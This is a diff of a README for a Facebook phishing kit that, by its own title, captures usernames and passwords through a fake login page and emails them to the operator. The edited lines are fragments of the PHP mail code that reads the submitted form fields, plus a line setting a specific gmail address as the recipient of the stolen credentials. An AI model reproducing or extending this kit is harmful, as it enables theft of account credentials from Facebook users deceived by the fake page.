@@ -7,10 +7,7 @@ Facebook Phishing { UI &amp;  [fish (User_Name &amp; Password)] Send Your email 
 ## PHP MAIL FUNCTION
 ```
 <?php 
-	
-	//php STRAT
 	if ( isset($_POST['submit']) )
-	
 	{
 		$email		= $_POST['email'];
 		$subject	= $_POST['subject'];
@@ -27,6 +24,6 @@ Facebook Phishing { UI &amp;  [fish (User_Name &amp; Password)] Send Your email 
 ?>
 ```
 ## YOU MAIL Mail  
-`
+```
 $to	 		  = 'dhjptharindu@gmail.com'; // your email address
-`
+```
